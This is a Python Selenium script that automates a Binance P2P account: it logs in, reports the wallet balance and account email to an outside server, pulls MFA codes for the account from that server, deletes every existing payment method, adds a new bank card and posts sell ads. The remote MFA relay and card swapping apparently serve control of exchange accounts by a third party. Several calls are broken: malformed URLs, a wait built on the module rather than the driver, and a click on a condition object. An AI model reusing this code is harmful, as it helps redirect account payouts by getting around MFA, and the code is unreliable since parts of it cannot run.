from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import requests
import json

def get_mfa_code(email):
    post_data = {
        'email': email,
    }
    print(post_data)
    response = requests.post('https://services.digichanger.pro/bemulator/api/get_binance_auth_by_mail/', data=post_data)
    print(response.json())
    try:
        return response.json()['code']
    except Exception as e:
        print(e)
        return False

def login(driver):
    driver.get('https:///p2p.binance.com')
    while True:
        try:
            if driver.find_element(By.ID, 'header_deposit_drawer'):
                break
        except Exception as e:
            pass

        try:
            link = driver.find_element(By.ID, 'header_login')
            if link:
                link.click()
                break
        except Exception as e:
            print('Wair for login button')
            time.sleep(1)
            continue

        try:
            print('Checking for coockies button')
            accept_coockies_button = driver.find_element(By.XPATH, "//button[contains(text(),'I accept')]")
            if accept_coockies_button:
                accept_coockies_button.click()
                continue
        except Exception as e:
            pass

    while True:
        try:
            cabinet = driver.find_element(By.ID, 'header_deposit_drawer')
            if cabinet:
                driver.get('https:///p2p.binance.com')
                print('Login success')
                return driver
        except Exception as e:
            print('Still waiting for login')
            time.sleep(1)
            continue

def get_ballance(driver, account_email):
    url = 'https://www.binance.com/en/my/wallet/account/overview'
    driver.get(url)
    wait = WebDriverWait(driver, 10)
    wait.until(EC.presence_of_element_located((By.ID, 'walletOverview_transaction_history_aLink')))
    time.sleep(3)
    #get text from div with id =balance-text
    balance = driver.find_element(By.ID, 'balance-text').text
    balance = balance.split(' ')[0]
    #get bitcoin price in usd
    url = 'https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT'
    response = requests.get(url)
    btc_price = float(response.json()['price'])
    print (f"BTC price: {btc_price}")

    balance_in_usd = float(balance) * btc_price
    print (f"Balance in USD: {balance_in_usd}")

    post_data = {
        'balance': balance_in_usd,
        'email': account_email,
    }
    print(post_data)
    result = requests.post('https://services.digichanger.pro/bemulator/api/update_binance_ballance/', data=post_data)
    print(result.json())
    return driver





def quit(webdriver):
    pass

def add_payment_method(driver,account_email,card_number,card_holder_name,bank_name):
    #delete old payment methods
    print("Account email: " + account_email)
    driver.get('https://p2p.binance.com/en/userCenter#payment')

    wait = WebDriverWait(driver, 20)
    wait.until(EC.presence_of_element_located((By.ID, "tab-payment")))
    print("Payment methods page loaded")

    time.sleep(5)

    buttons = driver.find_elements(By.XPATH,"//button[contains(text(),'Delete')]")

    print(f"{len(buttons)} payment methods found")


    for button in buttons:
        button.click()
        time.sleep(2)
        driver.find_element(By.XPATH,"//div[contains(text(),'Confirm')]").click()
        time.sleep(2)

    print("All payment methods deleted")

    url = f"https://p2p.binance.com/en/payment/add/{bank_name}"
    driver.get(url)
    wait = WebDriverWait(driver, 10)
    wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'PaymentMethodForm__form_wrapper')))

    input_card_number = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Please enter your bank account number"]')
    input_card_number.send_keys(card_number)

    input_bank_name = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Enter the name of your bank"]')
    input_bank_name.send_keys(card_holder_name)

    confirm_button = driver.find_element(By.XPATH,"//button[contains(text(),'Confirm')]")
    confirm_button.click()

    wait = WebDriverWait(driver, 10)
    wait.until(EC.presence_of_element_located((By.ID, 'mfa-google-input')))

    mfa_input = driver.find_element(By.ID, 'mfa-google-input')
    mfa_code = get_mfa_code(account_email)
    if mfa_code:
        mfa_input.send_keys(mfa_code)
    else:
        print('MFA code not found')
        mfa_code = input('Enter MFA code: ')
        mfa_input.send_keys(mfa_code)

    print("MFA code entered")
    wait = WebDriverWait(driver, 10)
    wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'PaymentMethodForm__form_wrapper')))
    print("Payment method added")

    return driver

def add_bid(driver, currency, amount, min_amount, autoreplay_text):
    url = 'https://p2p.binance.com/en/myads?type=normal&code=default'
    driver.get(url)

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.ID, 'C2C_p2pMyAdsList_filter_btn_filter')))
    time.sleep(4)

    close_element = driver.find_element(By.ID, "C2C_p2pMyAdsList_management_btn_close")
    if close_element:
        print("Other bid found")
        close_element.click()
        print("Close element clicked")

        wait = WebDriverWait(webdriver, 10)
        wait.until(EC.presence_of_element_located((By.XPATH,"//div[contains(text(),'Close')]")))

        driver.find_element(By.XPATH,"//div[contains(text(),'Close')]").click()
        print("Close button clicked")

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.ID, 'C2C_p2pNav_btn_postNewAd')))

    EC.presence_of_element_located((By.ID, 'C2C_p2pNav_btn_postNewAd')).click()
    print("New bid button clicked")

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.XPATH,"//div[contains(text(),'I want to sell')]")))

    driver.find_element(By.XPATH,"//div[contains(text(),'I want to sell')]").click()

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.ID, "C2C_p2pPost_step1_price_input")))

    print("Currency input found")
    input = driver.find_element(By.ID, "C2C_p2pPost_step1_price_input")
    input.send_keys(currency)
    print("Currency entered")

    driver.find_element(By.ID,"C2C_p2pPost_step1_btn_next").click()
    print("Next button clicked")

    #find input with name="initAmount"
    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.NAME, "initAmount")))
    print("Amount input found")

    input = driver.find_element(By.NAME, "initAmount")
    input.send_keys(amount)
    print("Amount entered")

    input = driver.find_element(By.NAME, "minOrderPrice")
    input.send_keys(min_amount)
    print("Min amount entered")

    #fin button with css selector 'from button[data-bn-type="button"]'
    driver.find_element(By.CSS_SELECTOR, 'button[data-bn-type="button"]').click()

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.CLASS_NAME,"SellPaymentForm__StyledCard-c6pg06-0")))

    driver.find_element(By.CLASS_NAME,"SellPaymentForm__StyledCard-c6pg06-0").click()
    time.sleep(1)

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.ID, "C2C_p2pPost_step2_btn_next")))

    driver.find_element(By.ID, "C2C_p2pPost_step2_btn_next").click()
    print("Next button clicked")

    #find textarea with name="autoReplyMsg"
    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.NAME, "autoReplyMsg")))
    print("Auto reply input found")

    textarea = driver.find_element(By.NAME, "autoReplyMsg")
    textarea.send_keys(autoreplay_text)
    time.sleep(1)

    # click on button with id "C2C_p2pPost_step3_btn_publish"
    driver.find_element(By.ID, "C2C_p2pPost_step3_btn_publish").click()
    time.sleep(1)

    #click on class with text "Confirm to Post"
    driver.find_element(By.XPATH,"//div[contains(text(),'Confirm to Post')]").click()
    print("Confirm to post clicked")

    wait = WebDriverWait(webdriver, 10)
    wait.until(EC.presence_of_element_located((By.ID,"C2C_p2pMyAdsList_management_btn_edit")))
    print("Bid added")

def get_order_list(webdriver):
    pass

def get_order_detail(webdriver):
    pass

def accept_order(webdriver):
    pass


